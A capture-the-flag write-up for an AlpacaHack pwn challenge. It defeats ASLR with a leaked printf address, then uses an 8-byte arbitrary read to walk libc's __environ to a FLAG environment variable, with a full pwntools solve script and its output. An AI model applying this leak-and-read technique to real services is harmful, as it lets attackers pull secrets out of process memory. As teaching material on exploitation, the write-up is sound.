---
title: "what is my pointer 2: walking __environ to the flag"
date: 2026-09-30 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "With a printf leak and an 8-byte arbitrary read, __environ leads to the stack, where the flag lives only as an environment variable."
description: "With a printf leak and an 8-byte arbitrary read, __environ leads to the stack, where the flag lives only as an environment variable."
tags: ["pwn"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
## Overview

A 64-bit Linux binary that leaks the runtime address of `printf` and then enters an infinite loop accepting arbitrary memory addresses, printing the 8 bytes stored at each one.

```c
printf("printf @ %p\n", printf);
while (1) {
    scanf("%lx%*c", &ptr);
    printf("%lx\n", *(unsigned long *)ptr);
}
```

## Where's the Flag?

The Dockerfile passes the flag as an environment variable to the process via xinetd:

```
env = FLAG=$(cat /tmp/flag.txt)
```

The file is then deleted, so the flag lives **only in the `FLAG` environment variable** of the running process. Environment variables sit on the stack, and libc exports a global `__environ` pointer (`char **`) that points to the `envp` array.

## Exploit

The exploit is a two-step info leak:

1. **Defeat ASLR** - parse the `printf @ <addr>` leak to compute the libc base:
   ```
   libc_base = printf_addr - libc.symbols["printf"]
   ```

2. **Find the flag** - use the arbitrary read to walk from libc's `__environ` symbol down to the `FLAG=` entry:
   ```
   __environ addr  →  read it  →  envp[] pointer on stack
   envp[] pointer  →  walk entries  →  FLAG=Alpaca{...}
   ```

## Solve Script

```python
from pwn import *

p = remote("<host>", 31402)
libc = ELF("./libc.so.6")

# Step 1: parse printf leak, compute libc base
printf_addr = int(p.recvline().split(b"@ ")[1].strip(), 16)
log.info(f"printf @ {printf_addr:#x}")
libc.address = printf_addr - libc.symbols["printf"]
log.info(f"libc base @ {libc.address:#x}")

environ_sym_addr = libc.symbols["__environ"]
log.info(f"__environ symbol @ {environ_sym_addr:#x}")

def read_qword(addr):
    p.recvuntil(b"read:")
    p.sendline(hex(addr)[2:].encode())
    return int(p.recvline().strip(), 16)

# Step 2: dereference __environ to get envp on the stack
envp = read_qword(environ_sym_addr)
log.info(f"envp array @ {envp:#x}")

# Step 3: walk envp[] until we find FLAG=
i = 0
while True:
    entry_ptr = read_qword(envp + i * 8)
    if entry_ptr == 0:
        break
    s = b""
    for j in range(32):
        chunk = read_qword(entry_ptr + j * 8).to_bytes(8, "little")
        if b"\x00" in chunk:
            s += chunk[:chunk.index(b"\x00")]
            break
        s += chunk
    if s.startswith(b"FLAG="):
        log.success(f"FLAG: {s.decode()}")
        break
    i += 1

p.close()
```

## Output

```
[+] Opening connection to <host> on port 31402: Done
[*] printf @ 0x7fa495e31100
[*] libc base @ 0x7fa495dd1000
[*] __environ symbol @ 0x7fa495fdbd58
[*] envp array @ 0x7ffc9b340e58
[+] FLAG: FLAG=Alpaca{33333333nnnnnnnnvvvvvvvv11111111rrrrrrrr00000000nnnnnnnn}
```
{% endraw %}
